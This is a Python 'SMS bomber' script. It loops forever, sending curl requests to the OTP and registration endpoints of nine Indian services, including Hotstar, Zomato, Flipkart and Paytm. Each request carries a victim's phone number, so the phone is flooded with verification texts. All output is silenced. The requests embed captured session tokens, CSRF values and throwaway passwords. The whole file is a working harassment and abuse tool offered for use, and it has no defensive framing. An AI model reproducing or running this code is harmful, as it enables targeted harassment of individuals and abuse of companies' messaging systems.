#!/usr/bin/env python
import sys, os
sys.stderr = open(os.devnull, 'w')
import random
import subprocess
from subprocess import call

C_BOX    = "\033[1;35m"
C_TITLE  = "\033[1;37m"
C_LABEL  = "\033[1;36m"
C_VALUE  = "\033[1;32m"
C_WARN   = "\033[1;33m"
C_SIGN   = "\033[101m\033[1;37m"
C_RED    = "\033[1;31m"
RESET    = "\033[0m"

def infinite(target):
    while True:
        try:
            subprocess.Popen(
                '''curl -X PUT -H "Host:api.hotstar.com" -H "content-length:51" -H "x-hs-usertoken:eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJhdWQiOiJ1bV9hY2Nlc3MiLCJleHAiOjE2MDE1NjE4NTksImlhdCI6MTYwMDk1NzA1OSwiaXNzIjoiVFMiLCJzdWIiOiJ7XCJoSWRcIjpcIjAzN2EwZmUzNjgzMDRlYzc5OGMzYTE0ODA5MzZhMTEyXCIsXCJwSWRcIjpcImQzZmU0ZDAyMzYxODRhNGFiYmE0M2Q0MDY2Y2RhYjBkXCIsXCJuYW1lXCI6XCJHdWVzdCBVc2VyXCIsXCJpcFwiOlwiMjQwOTo0MDYzOjRlMmI6N2FmZjo6NDc0OToyYTBjXCIsXCJjb3VudHJ5Q29kZVwiOlwiaW5cIixcImN1c3RvbWVyVHlwZVwiOlwibnVcIixcInR5cGVcIjpcImd1ZXN0XCIsXCJpc0VtYWlsVmVyaWZpZWRcIjpmYWxzZSxcImlzUGhvbmVWZXJpZmllZFwiOmZhbHNlLFwiZGV2aWNlSWRcIjpcImZhYTg4ZjA1LTc0MzItNDEwMy05ODg2LTdiZDkzNGY1YzNhMVwiLFwicHJvZmlsZVwiOlwiQURVTFRcIixcInZlcnNpb25cIjpcInYyXCIsXCJzdWJzY3JpcHRpb25zXCI6e1wiaW5cIjp7fX0sXCJpc3N1ZWRBdFwiOjE2MDA5NTcwNTkwOTh9IiwidmVyc2lvbiI6IjFfMCJ9.UJP1xZvNR_mGEN4ZVswMkkb1VZhHJL60XtObL48Izcc" -H "user-agent:Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36" -H "content-type:application/json" -H "x-hs-platform:PCTV" -H "x-country-code:IN" -H "x-hs-device-id:faa88f05-7432-4103-9886-7bd934f5c3a1" -H "hotstarauth:st=1600957099~exp=1600963099~acl=/um/v3/*~hmac=dc2680f8d081c49647a2cfe43d4f67b015729c23514d944d46281373208e951d" -H "x-hs-appversion:5.0.40" -H "x-request-id:faa88f05-7432-4103-9886-7bd934f5c3a1" -H "accept:*/*" -H "origin:https://www.hotstar.com" -H "sec-fetch-site:same-site" -H "sec-fetch-mode:cors" -H "sec-fetch-dest:empty" -H "referer:https://www.hotstar.com/in/subscribe/sign-in" -H "accept-encoding:gzip, deflate, br" -H "accept-language:en-US,en;q=0.9,hi;q=0.8" -d '{"phone_number":"''' + target + '''","country_prefix":"91"}' "https://api.hotstar.com/um/v3/users/037a0fe368304ec798c3a1480936a112/register?register-by=phone_otp" > /dev/null 2>&1''',
                shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            
            subprocess.Popen(
                '''curl -X POST -H "Host:api.cloud.altbalaji.com" -H "Connection:keep-alive" -H "Content-Length:86" -H "Accept:application/json, text/plain, */*" -H "User-Agent:Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36" -H "X-API-KEY:eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6Ik1TalA5OXV4OGhLazFrS1UifQ.eyJwaG9uZV9udW1iZXIiOiI5NTE5ODc0NzA0IiwiY291bnRyeV9jb2RlIjoiOTEiLCJwbGF0Zm9ybSI6IndlYiIsImV4cCI6MTYwMTA0MzI4OTEyN30.oNzgLsMqF8n9jroKUG9F3cXR90Wm1OyJLvVuG-XaklE" -H "Content-Type:application/json" -H "Origin:https://www.altbalaji.com" -H "Sec-Fetch-Site:same-site" -H "Sec-Fetch-Mode:cors" -H "Sec-Fetch-Dest:empty" -H "Referer:https://www.altbalaji.com/user-detail?pid=NTU%3D" -H "Accept-Encoding:gzip, deflate, br" -H "Accept-Language:en-US,en;q=0.9,hi;q=0.8" -d '{"phone_number":"''' + target + '''","country_code":"91","platform":"web","exp":1601043289127}' "https://api.cloud.altbalaji.com/accounts/mobile/verify?domain=IN" > /dev/null 2>&1''',
                shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            
            subprocess.Popen(
                '''curl -X POST -H "Host:us-central1-vootdev.cloudfunctions.net" -H "content-length:59" -H "accept:application/json, text/plain, */*" -H "user-agent:Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36" -H "content-type:application/json;charset=UTF-8" -H "origin:https://www.voot.com" -H "sec-fetch-site:cross-site" -H "sec-fetch-mode:cors" -H "sec-fetch-dest:empty" -H "referer:https://www.voot.com/" -H "accept-encoding:gzip, deflate, br" -H "accept-language:en-US,en;q=0.9,hi;q=0.8" -d '{"type":"mobile","mobile":"''' + target + '''","countryCode":"+91"}' "https://us-central1-vootdev.cloudfunctions.net/usersV3/v3/checkUser" > /dev/null 2>&1''',
                shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            
            subprocess.Popen(
                '''curl -X POST -H "Host:apiv2.sonyliv.com" -H "content-length:111" -H "device_id:5836d9e1f6cb4f029bb44161b37c4fa0-1600956156120" -H "security_token:eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJpYXQiOjE2MDA5NTYxMDgsImV4cCI6MTYwMjI1MjEwOCwiYXVkIjoiKi5zb255bGl2LmNvbSIsImlzcyI6IlNvbnlMSVYiLCJzdWIiOiJzb21lQHNldGluZGlhLmNvbSJ9.I8vEXYZ4J6shgQzIOLWTq8ig7WALBfj42Bng0hPG8DKJjM5iEKrUL3uhK0KrUdR_K-_ZygrGjaLzMxsP4-n3iR7Tiof_uSjNZ9-LntnHGDB1yTASX4ix4luUOew547IpjalclVbpR0-eJ3HTaFaSkM06L0ahK9Xj5GUxfxGLODv0ROYLMR26v0BF6z23pl1M-_C9voY_HJ6R_aZ4jItQjeJre11NxHcPnf8rU16QDIn6Oxxw5fHCaVpFRIWfs_3BdTz2fONzIO7o0n-sJk8w_TnFQy--8QQ6ZWIL1snd1v-2jvh4L59zjy5TVZJopmWnUUUxWRtiTQzGvx-ifqjUEaZBujHS8Ll1g5bp5oiWYfUEJskP3kPa7iopY19B6Xp_ondgsbW34tpX6uyZ5ZcW58E9wVyNwNmhcanWySxoPjI_Ng0dhXD5H03Z9yfbe6RnZcealVYBmD6ogTdh4V6Q41IyZcPOQelKNJT0XCwzExpZUQ4Ly7VTZIk8j4PFuJvmgFA6CvnYIjf0rAZR9cnLBq7quU4W9n07ngSsBuVG7KRGxV9qB98goaGrgepx0EJH-kAIWsfyWEdORLCLo-FykORLUXPFOEULd2rINn5i_mspSkyg6_UUHUWV8nMqhyjP4zVLeIMXyNusDLSMHvW5PmpBVDSNl-oWkr4dITLE_cc" -H "user-agent:Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36" -H "content-type:application/json" -H "accept:application/json, text/plain, */*" -H "session_id:cc86326a51504133bacd3ce4f796e1cf-1600956156256" -H "x-via-device:true" -H "app_version:3.1.20" -H "origin:https://www.sonyliv.com" -H "sec-fetch-site:same-site" -H "sec-fetch-mode:cors" -H "sec-fetch-dest:empty" -H "accept-encoding:gzip, deflate, br" -H "accept-language:en-US,en;q=0.9,hi;q=0.8" -d '{"channelPartnerID":"MSMIND","mobileNumber":"''' + target + '''","country":"IN","timestamp":"2020-09-24T14:03:03.505Z"}' "https://apiv2.sonyliv.com/AGL/1.6/A/ENG/WEB/IN/CREATEOTP" > /dev/null 2>&1''',
                shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            
            subprocess.Popen(
                '''curl -X POST -H "Host:www.zomato.com" -H "content-length:80" -H "x-zomato-csrft:a6b0c09972b2bdd30c9c1b6552caee5d" -H "save-data:on" -H "user-agent:Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36" -H "content-type:application/json" -H "accept:*/*" -H "origin:https://www.zomato.com" -H "sec-fetch-site:same-origin" -H "sec-fetch-mode:cors" -H "sec-fetch-dest:empty" -H "referer:https://www.zomato.com/kanpur" -H "accept-encoding:gzip, deflate, br" -H "accept-language:en-US,en;q=0.9,hi;q=0.8" -d '{"country_id":1,"phone":"''' + target + '''","verification_type":"sms","method":"phone"}' "https://www.zomato.com/webroutes/auth/login" > /dev/null 2>&1''',
                shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            
            subprocess.Popen(
                '''curl -X POST -H "Host:www.dream11.com" -H "content-length:316" -H "accept:*/*" -H "device:pwa" -H "x-csrf:fb1f1947-4547-392d-9a28-a9de30d9e766" -H "save-data:on" -H "user-agent:Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36" -H "content-type:application/json" -H "origin:https://www.dream11.com" -H "sec-fetch-site:same-origin" -H "sec-fetch-mode:cors" -H "sec-fetch-dest:empty" -H "referer:https://www.dream11.com/register" -H "accept-encoding:gzip, deflate, br" -H "accept-language:en-US,en;q=0.9,hi;q=0.8" -d '{"query":"mutation register( $email: String! $mobileNumber: String! $password: String! $site: String) { registerSendOTPMutation( email: $email mobileNumber: $mobileNumber password: $password site: $site ) { message }}","variables":{"email":"tsunami@gmail.com","mobileNumber":"''' + target + '''","password":"tsunami@123astronomia"}}' "https://www.dream11.com/graphql/mutation/pwa/register" > /dev/null 2>&1''',
                shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            
            subprocess.Popen(
                '''curl -X POST -H "Host:api.lenskart.com" -H "content-length:26" -H "origin:https://www.lenskart.com" -H "user-agent:Mozilla/5.0 (Linux; U; Android 8.1.0; en-us; CPH1909 Build/O11019) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.134 Mobile Safari/537.36" -H "content-type:application/json;charset=UTF-8" -H "accept:application/json, text/plain, */*" -H "cache-control:no-cache, no-store" -H "x-api-client:mobilesite" -H "referer:https://www.lenskart.com/customer/account/login" -H "accept-encoding:gzip, deflate" -H "accept-language:en-US" -d '{"telephone":"''' + target + '''"}' "https://api.lenskart.com/v2/customers/sendOtp" > /dev/null 2>&1''',
                shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            
            subprocess.Popen(
                '''curl -X POST -H "Host:1.rome.api.flipkart.com" -H "Connection:keep-alive" -H "Content-Length:338" -H "x-user-agent:Mozilla/5.0 (Linux; U; Android 8.1.0; en-us; CPH1909 Build/O11019) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.134 Mobile Safari/537.36 FKUA/msite/0.0.3/msite/Mobile" -H "Origin:https://www.flipkart.com" -H "User-Agent:Mozilla/5.0 (Linux; U; Android 8.1.0; en-us; CPH1909 Build/O11019) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.134 Mobile Safari/537.36" -H "content-type:application/json" -H "Accept:*/*" -H "Referer:https://www.flipkart.com/login" -H "Accept-Encoding:gzip, deflate" -H "Accept-Language:en-US" -d '{"actionRequestContext":{"type":"LOGIN_IDENTITY_VERIFY","loginIdPrefix":"+91","loginId":"''' + target + '''","loginType":"MOBILE","verificationType":"OTP","screenName":"LOGIN_V4_MOBILE","sourceContext":"DEFAULT"}}' "https://1.rome.api.flipkart.com/1/action/view" > /dev/null 2>&1''',
                shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            
            subprocess.Popen(
                '''curl -X POST -H "Host:accounts.paytm.com" -H "Connection:keep-alive" -H "Content-Length:286" -H "Accept:application/json, text/plain, */*" -H "Origin:https://accounts.paytm.com" -H "User-Agent:Mozilla/5.0 (Linux; U; Android 8.1.0; en-us; CPH1909 Build/O11019) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.134 Mobile Safari/537.36" -H "Content-Type:application/json" -H "Referer:https://accounts.paytm.com/oauth2/authorize?theme=mp-html5" -H "Accept-Encoding:gzip, deflate" -H "Accept-Language:en-US" -d '{"email":"","mobile":"''' + target + '''","loginPassword":"Pura@1090","csrfToken":"f7ea628c-91a2-5f14-82ca-6f7eee295b1d","redirectUri":"https://paytm.com/v1/api/authresponse","clientId":"paytm-web-secure","scope":"paytm","state":"","responseType":"code","theme":"mp-html5","dob_agreement":true}' "https://accounts.paytm.com/v2/api/register" > /dev/null 2>&1''',
                shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

        except KeyboardInterrupt:
            raise
        except Exception:
            pass

def run_bomber():
    import sys
    if len(sys.argv) > 1:
        target = sys.argv[1]
    else:
        target = input("Enter Target Phone No.: +91")
    
    ph1 = '1234567890'
    ph2 = '1234567890'
    
    if target == '' or target == ph1 or target == ph2 or len(target) != 10:
        print("Invalid number!")
        sys.exit(1)
    
    print("\n[!] Bombing started on +91" + target + "\n")
    try:
        infinite(target)
    except KeyboardInterrupt:
        print("\nBombing stopped!\n")

if __name__ == '__main__':
    run_bomber()
